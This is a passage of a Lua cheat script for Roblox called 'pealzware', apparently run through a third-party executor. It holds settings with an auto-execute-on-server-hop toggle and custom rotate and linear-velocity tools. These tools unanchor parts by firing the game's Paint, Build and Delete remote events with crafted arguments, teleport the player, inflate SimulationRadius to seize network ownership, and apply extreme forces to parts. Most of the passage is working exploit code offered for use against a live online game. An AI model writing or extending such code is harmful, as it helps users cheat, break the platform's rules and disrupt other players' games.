local _hotDescConn = nil
local _hotCharConn = nil

local function _hotApplyToHead(head)
    if not head then return end
    for _, child in ipairs(head:GetChildren()) do
        if child:IsA("BillboardGui") and HUB_ROLE_BILLBOARD_NAMES[child.Name] then
            child.Enabled = not _hotHideEnabled
        end
    end
end

local function _hotHookHead(head)
    if _hotDescConn then _hotDescConn:Disconnect(); _hotDescConn = nil end
    if not head then return end
    _hotDescConn = head.ChildAdded:Connect(function(child)
        if _hotHideEnabled and child:IsA("BillboardGui") and HUB_ROLE_BILLBOARD_NAMES[child.Name] then
            child.Enabled = false
        end
    end)
    _hotApplyToHead(head)
end

SettingsGroup:CreateToggle({
    Name = 'Hide Own Tag',
    Default = false,
    Tooltip = 'Hides your pealzware tag above your head (only you see the change)'
}):OnChanged(function(val)
    _hotHideEnabled = val
    if val then
        if plr.Character then
            _hotHookHead(plr.Character:FindFirstChild("Head"))
        end
        if _hotCharConn then _hotCharConn:Disconnect() end
        _hotCharConn = plr.CharacterAdded:Connect(function(char)
            local head = char:WaitForChild("Head", 5)
            if _hotHideEnabled then _hotHookHead(head) end
        end)
    else
        if _hotDescConn then _hotDescConn:Disconnect(); _hotDescConn = nil end
        if _hotCharConn then _hotCharConn:Disconnect(); _hotCharConn = nil end
        if plr.Character then
            _hotApplyToHead(plr.Character:FindFirstChild("Head"))
        end
    end
    Library:Notify(val and "Tag hidden" or "Tag visible", 2)
end)

SettingsGroup:CreateSlider({
    Name = 'Recent Server Memory',
    Default  = 3,
    Min      = 0,
    Max      = 20,
    Increment = 0,
    Tooltip  = 'How many past servers to remember (won\'t show NEW tag)'
}):OnChanged(function(val)
    _sbHistoryMax = val
    pcall(renderServers)
end)

local _autoExecFileExists = false
pcall(function() _autoExecFileExists = isfile and isfile("pealzwareCache/no_auto_exec.txt") end)

SettingsGroup:CreateToggle({
    Name = 'Auto Execute on Hop',
    Default = not _autoExecFileExists,
    Tooltip = 'Automatically re-run the script when server hopping'
}):OnChanged(function(val)
    pcall(function()
        pcall(makefolder, "pealzwareCache")
        if val then
            if isfile and isfile("pealzwareCache/no_auto_exec.txt") then
                delfile("pealzwareCache/no_auto_exec.txt")
            end
        else
            writefile("pealzwareCache/no_auto_exec.txt", "1")
        end
    end)
    _queueAutoExec()
    Library:Notify(val and "Auto execute ON" or "Auto execute OFF", 2)
end)

SettingsGroup:CreateDivider()

SettingsGroup:CreateLabel({Text = 'Script Version: 3.0'})
SettingsGroup:CreateLabel({Text = 'Game: ' .. (productInfo and productInfo.Name or "Loading...")})
SettingsGroup:CreateLabel({Text = 'Place ID: ' .. game.PlaceId})
SettingsGroup:CreateLabel({Text = 'Player: ' .. plr.Name})
local StatusLabel = SettingsGroup:CreateLabel({Text = 'Status: ' .. (isOwner and 'OWNER 👑' or isPremium and 'PREMIUM ⭐' or 'USER 👥')})
registerPremiumUiRefresher(function()
    if StatusLabel and StatusLabel.SetText then
        StatusLabel:SetText('Status: ' .. (isOwner and 'OWNER 👑' or isPremium and 'PREMIUM ⭐' or 'USER 👥'))
    end
end)

local CreditsGroup = Tabs.Settings:CreateModule({Name = 'Credits'})
CreditsGroup:CreateLabel({Text = 'Developer: pealzware'})
CreditsGroup:CreateLabel({Text = 'Library: PealzwareUI'})

CreditsGroup:CreateButton({
    Name = 'Copy Job ID 📝',
    Function = function()
        if setclipboard then
            setclipboard(game.JobId)
            Library:Notify('Job ID copied to clipboard!', 3)
        end
    end
})

end -- /══ Settings & Credits ══

do -- ══ Custom Tool Helpers ══

-- Standalone tool panel / widget helpers (Library has no built-in equivalents).
-- These create lightweight floating ScreenGuis used by the Rotate, Clone, Giver, etc. tools.

createToolPanel = function(config)
    local gui = Instance.new("ScreenGui")
    gui.Name           = config.name or "ToolPanel"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn   = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Enabled        = false
    pcall(function() gui.Parent = CoreGui end)

    local bg = Instance.new("Frame")
    bg.Name                   = "Background"
    bg.BackgroundColor3       = Color3.fromRGB(18, 18, 24)
    bg.BackgroundTransparency = 0.05
    bg.BorderSizePixel        = 0
    bg.AnchorPoint            = config.anchor   or Vector2.new(0.5, 0)
    bg.Position               = config.position or UDim2.new(0.5, 0, 0.08, 0)
    bg.Size                   = config.size     or UDim2.new(0, 210, 0, 200)
    bg.Parent                 = gui
    local bgCorner = Instance.new("UICorner"); bgCorner.CornerRadius = UDim.new(0, 7); bgCorner.Parent = bg
    local bgStroke = Instance.new("UIStroke"); bgStroke.Color = Color3.fromRGB(55, 55, 72); bgStroke.Thickness = 1; bgStroke.Parent = bg

    local titleBar = Instance.new("Frame")
    titleBar.Name             = "TitleBar"
    titleBar.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
    titleBar.BorderSizePixel  = 0
    titleBar.Size             = UDim2.new(1, 0, 0, 28)
    titleBar.Parent           = bg
    local tbCorner = Instance.new("UICorner"); tbCorner.CornerRadius = UDim.new(0, 7); tbCorner.Parent = titleBar

    local titleLbl = Instance.new("TextLabel")
    titleLbl.BackgroundTransparency = 1
    titleLbl.Size     = UDim2.new(1, -10, 1, 0)
    titleLbl.Position = UDim2.new(0, 8, 0, 0)
    titleLbl.Font     = Enum.Font.GothamSemibold
    titleLbl.TextSize = 13
    titleLbl.TextColor3 = Color3.fromRGB(225, 225, 235)
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.Text   = config.title or "Tool"
    titleLbl.Parent = titleBar

    local statusLbl = Instance.new("TextLabel")
    statusLbl.Name  = "Status"
    statusLbl.BackgroundTransparency = 1
    statusLbl.Size     = UDim2.new(1, -10, 0, 16)
    statusLbl.Position = UDim2.new(0, 8, 0, 30)
    statusLbl.Font     = Enum.Font.Gotham
    statusLbl.TextSize = 11
    statusLbl.TextColor3 = Color3.fromRGB(140, 140, 158)
    statusLbl.TextXAlignment = Enum.TextXAlignment.Left
    statusLbl.Text  = config.statusText or ""
    statusLbl.Parent = bg

    local contentFrame = Instance.new("Frame")
    contentFrame.Name               = "Content"
    contentFrame.BackgroundTransparency = 1
    contentFrame.Size     = UDim2.new(1, 0, 1, -28)
    contentFrame.Position = UDim2.new(0, 0, 0, 28)
    contentFrame.Parent   = bg

    return { gui = gui, frame = contentFrame, status = statusLbl }
end

local function createToolInput(parent, yPos, placeholder)
    local box = Instance.new("TextBox")
    box.BackgroundColor3  = Color3.fromRGB(32, 32, 44)
    box.BorderSizePixel   = 0
    box.Size              = UDim2.new(0.9, 0, 0, 24)
    box.Position          = UDim2.new(0.05, 0, yPos, 0)
    box.Font              = Enum.Font.Gotham
    box.TextSize          = 12
    box.TextColor3        = Color3.fromRGB(215, 215, 225)
    box.PlaceholderColor3 = Color3.fromRGB(95, 95, 112)
    box.PlaceholderText   = placeholder or ""
    box.Text              = ""
    box.ClearTextOnFocus  = false
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 4); c.Parent = box
    box.Parent = parent
    return box
end

createToolButton = function(parent, text, yPos, xPos, width, callback)
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = Color3.fromRGB(42, 42, 56)
    btn.BorderSizePixel  = 0
    btn.Size             = UDim2.new(width or 0.9, 0, 0, 26)
    btn.Position         = UDim2.new(xPos  or 0.05, 0, yPos, 0)
    btn.Font             = Enum.Font.GothamSemibold
    btn.TextSize         = 12
    btn.TextColor3       = Color3.fromRGB(215, 215, 228)
    btn.AutoButtonColor  = false
    btn.Text             = text or "Button"
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 4); c.Parent = btn
    if callback then btn.MouseButton1Click:Connect(callback) end
    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(58, 58, 76) end)
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42, 42, 56) end)
    btn.Parent = parent
    return btn
end

createToolLabel = function(parent, text, yPos)
    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Size     = UDim2.new(0.9, 0, 0, 14)
    lbl.Position = UDim2.new(0.05, 0, yPos, 0)
    lbl.Font     = Enum.Font.Gotham
    lbl.TextSize = 11
    lbl.TextColor3 = Color3.fromRGB(185, 185, 200)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Text   = text or ""
    lbl.Parent = parent
    return lbl
end

function getplrcfr(p)
    local c = (p or localplr).Character
    if c and c:FindFirstChild("HumanoidRootPart") then
        return c.HumanoidRootPart.CFrame
    end
    return CFrame.new(0, 100, 0)
end

-- Rotation tool construction uses GeometryService:UnionAsync/IntersectAsync which
-- are async and may throw on unsupported executors.  Wrap entirely in pcall so a
-- failure here does NOT crash main() and leave Stash / Parts / Utility / Settings empty.
local rtool = nil  -- hoisted so createrotool() can reference it after pcall
local m = (1/3)/1.5
local gs = nil
pcall(function() gs = game:GetService("GeometryService") end)

function crep(offset,size)
    if typeof(offset) == "Vector3" then
        offset = CFrame.new(offset)
    end
    local p = Instance.new("Part")
    p.Anchored = true
    p.Position = getplrpos() + (offset.Position*m)
    p.Material = Enum.Material.SmoothPlastic
    p.Reflectance = 0.6
    p.Size = (size and size*m) or Vector3.new(3*m,3*m,3*m)
    p.Parent = workspace
    return p
end
function union(p1,p2s,un)
    local po
    if un then
        po = gs:UnionAsync(p1,p2s)
    else
        po = gs:IntersectAsync(p1,p2s)
    end
    p1:Destroy()
    for i,v in pairs(p2s) do
        v:Destroy()
    end
    return po[1]
end

-- Keep track of workspace parts so we can clean up if the build fails.
local _rToolTempParts = {}
local _rToolBuilt, _rToolErr = pcall(function()
    local p1 = crep(Vector3.new(0,0,0)); table.insert(_rToolTempParts, p1)
    local p2 = crep(Vector3.new(0,-1.5,1.5),Vector3.new(3,6,6)); table.insert(_rToolTempParts, p2)
    p2.Shape = Enum.PartType.Cylinder
    local w = union(p1,{p2})
    _rToolTempParts = {}  -- union consumed p1/p2, no orphans now
    w.UsePartColor = true
    w.Name = "fbr"
    w.Color = Color3.fromRGB(0,0,255)
    m = 1/1.5
    local c4 = w:Clone(); c4.Position = w.CFrame * Vector3.new(m,0,0);   c4.Name = "fbl"; c4.Rotation = Vector3.new(0,0,180);   c4.Color = Color3.fromRGB(0,255,0)
    local c3 = w:Clone(); c3.Position = w.CFrame * Vector3.new(0,m,0);   c3.Name = "ftr"; c3.Color = Color3.fromRGB(255,255,255)
    local c5 = w:Clone(); c5.Position = w.CFrame * Vector3.new(m,m,0);   c5.Name = "ftl"; c5.Color = Color3.fromRGB(255,0,0)
    local c1 = w:Clone(); c1.Position = w.CFrame * Vector3.new(0,0,m);   c1.Name = "bbr"; c1.Rotation = Vector3.new(180,0,0);   c1.Color = Color3.fromRGB(0,255,0)
    local c7 = w:Clone(); c7.Position = w.CFrame * Vector3.new(m,0,m);   c7.Name = "bbl"; c7.Rotation = Vector3.new(180,0,0);   c7.Color = Color3.fromRGB(0,0,255)
    local c2 = w:Clone(); c2.Position = w.CFrame * Vector3.new(0,m,m);   c2.Name = "btr"; c2.Rotation = Vector3.new(180,0,180); c2.Color = Color3.fromRGB(255,0,0)
    local c6 = w:Clone(); c6.Position = w.CFrame * Vector3.new(m,m,m);   c6.Name = "btl"; c6.Rotation = Vector3.new(180,0,180); c6.Color = Color3.fromRGB(255,255,255)
    w.Rotation = Vector3.new(0,0,180)
    local finished = union(w,{c1,c2,c3,c4,c5,c6,c7},true)
    finished.Anchored = false
    finished.CanCollide = false
    rtool = Instance.new("Tool")
    rtool.Grip = CFrame.Angles(0,math.rad(180),0)
    rtool.Name = "Rotation Tool"
    local handle = Instance.new("Part")
    handle.Size = Vector3.new(1,1,1)
    handle.Transparency = 1
    handle.CanCollide = false
    handle.Name = "Handle"
    local we = Instance.new("Weld")
    we.Parent = handle
    we.C0 = CFrame.new(-m/2,-m/2,m/2)
    handle.Parent = rtool
    finished.Parent = handle
    local cbt = Instance.new("Beam")
    local ba0 = Instance.new("Attachment")
    local ba1 = Instance.new("Attachment")
    cbt.Attachment0 = ba0; cbt.Attachment1 = ba1
    cbt.TextureLength = 6; cbt.TextureMode = Enum.TextureMode.Static
    cbt.Texture = "rbxassetid://18498294"
    ba0.Name = "A0"; ba1.Name = "A1"
    ba0.Parent = cbt; ba1.Parent = cbt
    cbt.Parent = rtool
end)

if not _rToolBuilt then
    -- Clean up any parts crep() placed before the crash
    for _, _pt in ipairs(_rToolTempParts) do
        pcall(function() _pt:Destroy() end)
    end
    warn("[pealzware] Rotation tool build failed (GeometryService unavailable): " .. tostring(_rToolErr))
end
_rToolTempParts = nil
local inverses = {
    [Enum.NormalId.Top] = Enum.NormalId.Bottom,
    [Enum.NormalId.Bottom] = Enum.NormalId.Top,
    [Enum.NormalId.Front] = Enum.NormalId.Back,
    [Enum.NormalId.Back] = Enum.NormalId.Front,
    [Enum.NormalId.Right] = Enum.NormalId.Left,
    [Enum.NormalId.Left] = Enum.NormalId.Right,
}
local power = 999999
local rotooltype = {name="Rotate"}
local roundNumber = 15
local lspeedNumber = 50
local rspeedNumber = 50
function hover(part,cfr,override)
    local occ = part.CanCollide
    part.CanCollide = false
    if rotooltype.name == "Rotate" or override then
        local hoverpos = Instance.new("BodyPosition")
        local hovergyr = Instance.new("BodyGyro")
        hoverpos.MaxForce = Vector3.new(power,power,power)
        hoverpos.P = power
        hoverpos.D = 2500
        hovergyr.MaxTorque = Vector3.new(power,power,power)
        hovergyr.P = power
        hovergyr.D = 6200
        hoverpos.Position = cfr.Position
        hovergyr.CFrame = cfr
         function delete(w)
            coroutine.wrap(function()
                task.wait(w or 0)
                hoverpos:Destroy()
                hovergyr:Destroy()
            end)()
            coroutine.wrap(function()
                task.wait(1)
                part.CanCollide = occ
            end)()
        end
        hoverpos.Parent = part
        hovergyr.Parent = part
        return delete
    elseif rotooltype.name == "Linear Velocity" then
        local repeatpositioning = game:GetService("RunService").RenderStepped:Connect(function()
            part.CFrame = cfr
            part.AssemblyLinearVelocity = (cfr * Vector3.new(0,0,-lspeedNumber)) - cfr.Position
            part.AssemblyAngularVelocity = Vector3.zero
        end)
         function delete(w)
            repeatpositioning:Disconnect()
            coroutine.wrap(function()
                task.wait(1)
                part.CanCollide = occ
            end)()
        end
        return delete
    end
end
local isnetworkowner = isnetworkowner or function(part)
    task.wait(0.5)
    return true
end
function gcp(p,plr)
    local c = (plr ~= nil and plr.Character) or localplr.Character
    p = p:lower()
    if p == "hrp" then
        p = "HumanoidRootPart"
    elseif p == "hum" then
        p = "Humanoid"
    end
    if c and c:FindFirstChild(p) then
        return c:FindFirstChild(p)
    else
        return false
    end
end
local tagged = {}
function gettag(t)
    return (tagged[t] and tagged[t] > tick()) or false
end
function settag(t,num)
    if not num then
        num = 1
    end
    tagged[t] = tick()+num
end
function rotate(part,cframe,currentrtool)
    if not equiptool("Build") or not equiptool("Delete") or not equiptool("Paint") then
        return
    end
    local done = false
    local done2 = false
    local t = tick()+10
    local p = nil
    repeat
        gcp("hrp").CFrame = (part.CFrame + Vector3.new(0,part.Size.Y/2+2.5,0))
        if part.Anchored and not gettag(part) then
            settag(part,0.6)
            local args = {
                part,
                Enum.NormalId.Top,
                getplrpos(),
                "material",
                nil,
                "anchor",
                ""
            }
            equiptool("Paint").Script.Event:FireServer(unpack(args))
        end
        localplr.SimulationRadius = math.max(localplr.SimulationRadius,100)
        task.wait()
    until isnetworkowner(part)
    coroutine.wrap(function()
        local cframe2 = cframe * CFrame.new(Vector3.new(0,part.Size.Y,0)) * cframe.Rotation
        local d = hover(part,cframe2,true)
        while not done and tick() < t do
            task.wait()
            part.CFrame = cframe2
        end
        d(5)
    end)()
    task.wait(0.5)
    local s,e = pcall(function()
        local args = {
            part,
            getplrpos()
        }
        coroutine.wrap(function()
            equiptool("Delete").Script.Event:FireServer(unpack(args))
        end)()
        local nid = Enum.NormalId.Bottom
        local args = {
            part,
            nid,
            getplrpos(),
            "normal"
        }
        coroutine.wrap(function()
            equiptool("Build").Script.Event:FireServer(unpack(args))
        end)()
        p = cfolder[localplr.Name].ChildAdded:Wait()
        p.CanCollide = false
        repeat
            gcp("hrp").CFrame = (p.CFrame + Vector3.new(0,p.Size.Y/2+2.5,0))
            if p.Anchored and not gettag(p) then
                settag(p,0.6)
                local args = {
                    p,
                    Enum.NormalId.Top,
                    getplrpos(),
                    "material",
                    nil,
                    "anchor",
                    ""
                }
                equiptool("Paint").Script.Event:FireServer(unpack(args))
            end
            localplr.SimulationRadius = math.max(localplr.SimulationRadius,100)
            task.wait()
        until isnetworkowner(p)
        p.CanCollide = true
        coroutine.wrap(function()
            local d = hover(p,cframe)
            repeat
                task.wait()
            until done2
            d(5)
        end)()
        task.wait(1)
        done = true
        local args = {
            p,
            Enum.NormalId.Right,
            getplrpos(),
            "material",
            nil,
            "anchor",
            ""
        }
        equiptool("Paint").Script.Event:FireServer(unpack(args))
    end)
    done = true
    currentrtool.Parent = localplr.Character
    task.wait(2)
    done2 = true
end
local rotatehandles = Instance.new("ArcHandles")
rotatehandles.Parent = game.CoreGui
local selectionbox = Instance.new("SelectionBox")
selectionbox.LineThickness = 0.05
selectionbox.SurfaceTransparency = 1
selectionbox.Parent = game.CoreGui
table.insert(tools,{rotatehandles,selectionbox})

local _rotPanel = createToolPanel({name = "RotateAngleUi", title = "Rotate Tool", size = UDim2.new(0, 200, 0, 160)})
local Shape = _rotPanel.gui
local InputLabel = createToolLabel(_rotPanel.frame, "Rounding to nearest 15 degrees", 0.18)
local TextBox = createToolInput(_rotPanel.frame, 0.35, "Type angle, press Enter")
local ConfirmButton = createToolButton(_rotPanel.frame, "Confirm", 0.55, 0.08, 0.84, nil)

function updateInputDisplay()
    local s = math.abs(roundNumber) ~= 1 and "s" or ""
    InputLabel.Text = string.format("Rounding to nearest %d degree%s", roundNumber, s)
end
updateInputDisplay()

 function lvToOrientation(v)
    return CFrame.Angles(
        math.rad(v.X * v.Z),
        math.rad(v.X * v.Y),
        math.rad(v.Y * v.Z + 90)
    )
end
if TextBox and TextBox.FocusLost then
    TextBox.FocusLost:Connect(function()
        local rn = tonumber(TextBox.Text)
        if rn then
            roundNumber = rn
            updateInputDisplay()
        end
        TextBox.Text = ""
    end)
end
function roundToNearest(num,by)
    return (by == 0 and num) or (math.round(num/by) * by)
end
function AngleFromAxis(axis,rA)
    rA = math.rad(roundToNearest(math.deg(rA),roundNumber))
    return axis==Enum.Axis.X and {rA,0,0}
    or axis==Enum.Axis.Y and {0,rA,0}
    or axis==Enum.Axis.Z and {0,0,rA}
end
function IsSelectable(part,hit)
    if part and localplr.Character:FindFirstChild("HumanoidRootPart") then
        if (hit - getplrpos()).magnitude < 30 and part:IsDescendantOf(cfolder) then return true end
    end
    return false
end
function notify(text,color)
    color = color or Color3.fromRGB(0,200,0)
    displayGeneralSystemMessage(string.format("<font color='#%s'>%s</font>", color:ToHex(), tostring(text or "")))
end
function sayto(plr,text,color)
    if plr == nil then
        sendGeneralChatMessage(text)
    elseif plr == localplr then
        notify(text,color)
    else
        local wc = getwc(localplr,plr)
        if wc then
            wc:SendAsync(text)
        end
    end
end
function createrotool()
    if not rtool then
        Library:Notify("Rotate Tool unavailable — GeometryService not supported by your executor", 5)
        return Instance.new("Tool")
    end
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://6897623656"
    sound.Parent = workspace
    sound:Play()
    game.Debris:AddItem(sound, 5)

    local connections = {}
    currentrtool = rtool:Clone()

    local oldBeam = currentrtool:FindFirstChildWhichIsA("Beam")
    if oldBeam then oldBeam:Destroy() end

    local equipped = false
    undo_part  = {}
    undo_cframe = {}
    selection  = nil
    lastCFrame = nil

    local to_undo_part  = nil
    local to_undo_cframe = nil
    local sclone = nil
    local mdown

    local handle = currentrtool.Handle
    local union  = handle:FindFirstChildWhichIsA("PartOperation")
    handle.Weld.Part0 = union
    handle.Weld.Part1 = handle

    table.insert(connections, currentrtool.Equipped:Connect(function()
        union.Parent = workspace
        equipped = true
        Shape.Enabled = true
        updateInputDisplay()
    end))

    table.insert(connections, currentrtool.Unequipped:Connect(function()
        if not equipped then return end
        union.Parent = handle
        selectionbox.Adornee  = nil
        rotatehandles.Adornee = nil
        selection = nil
        to_undo_part  = nil
        to_undo_cframe = nil
        rotatehandles.Axes = Axes.new(Enum.Axis.X, Enum.Axis.Y, Enum.Axis.Z)
        undo_part  = {}
        undo_cframe = {}
        if sclone then sclone:Destroy(); sclone = nil end
        equipped = false
        Shape.Enabled = false
    end))

    table.insert(connections, mouse.Button1Down:Connect(function()
        if not equipped then return end
        local issel = IsSelectable(mouse.Target, mouse.Hit.Position)
        if issel and selection ~= mouse.Target then
            selection = mouse.Target
            if sclone then sclone:Destroy() end
            sclone = selection:Clone()
            sclone.Size = sclone.Size + Vector3.new(0.01, 0.01, 0.01)
            sclone.Transparency = 0.5
            sclone.Anchored   = true
            sclone.CanCollide = false
            sclone.Parent = workspace
            table.insert(tools, {sclone})
            selectionbox.Adornee  = sclone
            rotatehandles.Adornee = sclone
        end
    end))

    table.insert(connections, mouse.Button1Up:Connect(function()
        if not equipped then return end
        if to_undo_part and to_undo_cframe then
            if to_undo_part ~= selection or to_undo_cframe ~= selection.CFrame then
                table.insert(undo_part,  to_undo_part)
                table.insert(undo_cframe, to_undo_cframe)
            end
        end
        to_undo_part  = nil
        to_undo_cframe = nil
        rotatehandles.Axes = Axes.new(Enum.Axis.X, Enum.Axis.Y, Enum.Axis.Z)
        mdown = nil
    end))

    table.insert(connections, rotatehandles.MouseButton1Down:Connect(function(axis)
        if not equipped then return end
        if selection and sclone then
            sclone.Transparency = 0.75
            mdown = workspace.CurrentCamera.CameraSubject
            local focusdiff = workspace.CurrentCamera.CFrame.Position - mdown.Parent.HumanoidRootPart.Position
            workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
            coroutine.wrap(function()
                while mdown do
                    workspace.Camera.CFrame = CFrame.new(focusdiff + mdown.Parent.HumanoidRootPart.Position)
                        * workspace.Camera.CFrame.Rotation
                    task.wait()
                end
            end)()
            lastCFrame    = sclone.CFrame
            to_undo_part  = selection
            to_undo_cframe = lastCFrame
            rotatehandles.Axes = Axes.new(axis)
        end
    end))

    table.insert(connections, rotatehandles.MouseButton1Up:Connect(function()
        if not equipped then return end
        mdown = nil
        if to_undo_part and to_undo_cframe then
            if to_undo_part ~= selection or to_undo_cframe ~= selection.CFrame then
                table.insert(undo_part,  to_undo_part)
                table.insert(undo_cframe, to_undo_cframe)
            end
        end
        if sclone then sclone.Transparency = 0.5 end
        to_undo_part  = nil
        to_undo_cframe = nil
        rotatehandles.Axes = Axes.new(Enum.Axis.X, Enum.Axis.Y, Enum.Axis.Z)
        workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
    end))

    table.insert(connections, rotatehandles.MouseDrag:Connect(function(axis, relativeAngle)
        if not equipped then return end
        if sclone then
            sclone.CFrame = lastCFrame * CFrame.Angles(unpack(AngleFromAxis(axis, relativeAngle)))
        end
    end))

    table.insert(connections, ConfirmButton.MouseButton1Click:Connect(function()
        if sclone and selection then
            rotate(selection, sclone.CFrame, currentrtool)
            sclone:Destroy(); sclone = nil
        end
    end))

    table.insert(connections, currentrtool.AncestryChanged:Connect(function()
        if not currentrtool or not currentrtool.Parent or not currentrtool.Parent.Parent then
            for _, c in pairs(connections) do c:Disconnect() end
        end
    end))

    table.insert(tools, {union, currentrtool})
    currentrtool.Parent = localplr.Backpack
    task.wait()
    return currentrtool
end

local _lvPanel = createToolPanel({
    name = "LinVelGui",
    title = "Linear Velocity",
    position = UDim2.new(0.5, 0, 0.03, 0),
    size = UDim2.new(0, 200, 0, 155),
    statusText = "Click block, then activate"
})
local LVGui = _lvPanel.gui
local LVSpeedLabel = createToolLabel(_lvPanel.frame, "Speed: 50 studs/s", 0.18)
local LVInput = createToolInput(_lvPanel.frame, 0.35, "Type speed, press Enter")
local LVStatus = _lvPanel.status

local lvSpeed = 50

if LVInput and scriptConnections then
    table.insert(scriptConnections, LVInput.FocusLost:Connect(function()
        local v = tonumber(LVInput.Text)
        if v then
            lvSpeed = v
            LVSpeedLabel.Text = "Speed: " .. v .. " studs/s"
            LVStatus.Text = "Speed updated ✓\nClick a block then activate"
        end
        LVInput.Text = ""
    end))
end

local lvBaseTool = Instance.new("Tool")
lvBaseTool.Name = "Linear Velocity Tool"
lvBaseTool.ToolTip = "Apply linear velocity to a block"
lvBaseTool.RequiresHandle = true

local lvHandlePart = Instance.new("Part")
lvHandlePart.Name = "Handle"
lvHandlePart.Size = Vector3.new(0.7, 0.7, 2.8)
lvHandlePart.Color = Color3.fromRGB(45, 100, 220)
lvHandlePart.Material = Enum.Material.SmoothPlastic
lvHandlePart.Reflectance = 0.35
lvHandlePart.CanCollide = false
lvHandlePart.Parent = lvBaseTool

do
    local mesh = Instance.new("SpecialMesh")
    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = "rbxassetid://430736398"
    mesh.Scale = Vector3.new(0.38, 0.38, 0.55)
    mesh.Parent = lvHandlePart
end

function createlinveltool()
    local connections = {}
    local tool = lvBaseTool:Clone()
    local equipped = false
    local lvSel = nil
    local lvSurface = nil
    local lvSBox = Instance.new("SelectionBox")
    lvSBox.Color3 = Color3.fromRGB(55, 130, 255)
    lvSBox.SurfaceColor3 = Color3.fromRGB(55, 130, 255)
    lvSBox.SurfaceTransparency = 0.65
    lvSBox.LineThickness = 0.07
    lvSBox.Parent = game.CoreGui
    table.insert(tools, {lvSBox})

    local lvBeam = Instance.new("Beam")
    lvBeam.Color = ColorSequence.new(Color3.fromRGB(55, 130, 255), Color3.fromRGB(0, 200, 255))
    lvBeam.Transparency = NumberSequence.new(0.3, 0.8)
    lvBeam.Width0 = 0.6
    lvBeam.Width1 = 0.15
    lvBeam.TextureLength = 4
    lvBeam.TextureMode = Enum.TextureMode.Static
    lvBeam.Texture = "rbxassetid://18498294"
    lvBeam.FaceCamera = true
    lvBeam.Enabled = false

    local lvA0 = Instance.new("Attachment")
    lvA0.Name = "LVBeamA0"
    local lvA1 = Instance.new("Attachment")
    lvA1.Name = "LVBeamA1"
    lvBeam.Attachment0 = lvA0
    lvBeam.Attachment1 = lvA1
    lvBeam.Parent = workspace.Terrain
    lvA0.Parent = workspace.Terrain
    lvA1.Parent = workspace.Terrain
    table.insert(tools, {lvBeam, lvA0, lvA1})

    local function updateBeam()
        if not lvSel or not lvSel.Parent or not lvSurface or not equipped then
            lvBeam.Enabled = false
            return
        end
        local faceVec = Vector3.FromNormalId(lvSurface)
        local worldDir = lvSel.CFrame:VectorToWorldSpace(faceVec).Unit
        local startPos = lvSel.Position
        local endPos = startPos + worldDir * math.min(lvSpeed * 0.15, 20)
        lvA0.WorldPosition = startPos
        lvA1.WorldPosition = endPos
        lvBeam.Enabled = true
    end

    table.insert(connections, tool.Equipped:Connect(function()
        equipped = true
        LVGui.Enabled = true
        LVStatus.Text = "Click a block to select,\nthen activate (Left Click)"
    end))

    table.insert(connections, tool.Unequipped:Connect(function()
        if not equipped then return end
        equipped = false
        LVGui.Enabled = false
        lvSBox.Adornee = nil
        lvSel = nil
        lvSurface = nil
        lvBeam.Enabled = false
    end))

    table.insert(connections, mouse.Button1Down:Connect(function()
        if not equipped then return end
        if not IsSelectable(mouse.Target, mouse.Hit.Position) then return end
        lvSel = mouse.Target
        lvSurface = mouse.TargetSurface
        lvSBox.Adornee = lvSel
        LVStatus.Text = "Selected: " .. lvSel.Name
            .. "\nSurface: " .. tostring(mouse.TargetSurface)
            .. "\nActivate to push!"
        updateBeam()
    end))

    table.insert(connections, mouse.Move:Connect(function()
        if not equipped or not lvSel or not lvSel.Parent then return end
        if mouse.Target == lvSel then
            lvSurface = mouse.TargetSurface
            updateBeam()
        end
    end))

    table.insert(connections, tool.Activated:Connect(function()
        if not equipped then return end
        if not lvSel or not lvSel.Parent then
            LVStatus.Text = "No block selected!\nClick one first"
            return
        end

        local part = lvSel
        local surface = mouse.TargetSurface
        LVStatus.Text = "Applying velocity..."

        task.spawn(function()
            local hrp = localplr.Character and localplr.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            if part.Anchored then
                local paint = localplr.Character:FindFirstChild("Paint") or localplr.Backpack:FindFirstChild("Paint")
                if paint then
                    if paint.Parent ~= localplr.Character then
                        paint.Parent = localplr.Character; task.wait()
                    end
                    paint.Script.Event:FireServer(part, Enum.NormalId.Top, hrp.Position, "material", nil, "anchor", "")
                    task.wait(0.9)
                end
            end

            hrp.CFrame = CFrame.new(part.Position + Vector3.new(0, part.Size.Y / 2 + 3, 0))
            task.wait(0.25)
            localplr.SimulationRadius = math.max(localplr.SimulationRadius, 500)
            task.wait(0.35)

            local faceVec = Vector3.FromNormalId(surface)
            local worldDir = part.CFrame:VectorToWorldSpace(faceVec).Unit

            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.P        = 1e7
            bv.Velocity = worldDir * lvSpeed
            bv.Parent   = part

            LVStatus.Text = "⚡ Pushed! Speed: " .. lvSpeed .. " studs/s"

            task.delay(0.6, function()
                if bv and bv.Parent then bv:Destroy() end
            end)

            lvSBox.Adornee = nil
            lvSel = nil
            lvSurface = nil
            lvBeam.Enabled = false
        end)
    end))

    table.insert(connections, tool.AncestryChanged:Connect(function()
        if not tool or not tool.Parent or not tool.Parent.Parent then
            for _, c in pairs(connections) do c:Disconnect() end
            lvSBox:Destroy()
            lvBeam.Enabled = false
        end
    end))

    table.insert(tools, {tool})
    tool.Parent = localplr.Backpack
    task.wait()
    return tool
end

local _rvPanel = createToolPanel({
    name = "RotVelGui",
    title = "Rotational Velocity",
    position = UDim2.new(0.5, 0, 0.03, 0),
    size = UDim2.new(0, 200, 0, 185),
    statusText = "Click block, then activate"
})
